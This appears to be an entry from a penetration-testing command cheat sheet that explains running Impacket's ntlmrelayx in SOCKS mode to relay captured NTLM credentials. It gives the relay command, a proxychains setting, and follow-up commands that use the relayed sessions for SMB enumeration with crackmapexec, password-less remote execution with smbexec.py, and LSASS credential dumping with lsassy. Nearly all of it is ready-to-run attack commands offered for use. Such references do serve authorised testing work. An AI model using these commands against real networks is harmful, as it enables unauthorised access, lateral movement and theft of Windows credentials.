---
title: |
  Start ntlmrelayx in socks mode to relay multiple SMB requests later on (multiple commands)
description: |
  This module performs the SMB Relay attacks originally discovered by cDc extended to many target protocols (SMB, MSSQL, LDAP, etc).
  It receives a list of targets and for every connection received it will choose the next target and try to relay the credentials. Also, if specified, it will first to try authenticate against the client connecting to us.

  Type socks to see the opened socks sessions:
  ntlmrelayx> socks

  Edit proxychains to your ntlmrelayx IP 
  /etc/proxychains.conf:
  [ProxyList]
  socks4 <yourIP> 1080

  now you can relay traffic through the socks proxy e.g:
  proxychains crackmapexec smb 10.1.0.73 -u ppaalm -p '' -d paragon
  proxychains smbexec.py -no-pass paragon/ppaalm@10.1.0.160
  proxychains lsassy 10.1.0.160 -u ppaalm -d paragon

  Command Reference:

  	-tf: targets file
command: |
  ntlmrelayx.py -tf targets.txt -socks -smb2support
items:
  - No_Creds
services:
  - SMB
  - LDAP
OS:
  - Linux
attack_types:
  - Enumeration
  - Exploitation
references:
  - https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py
---
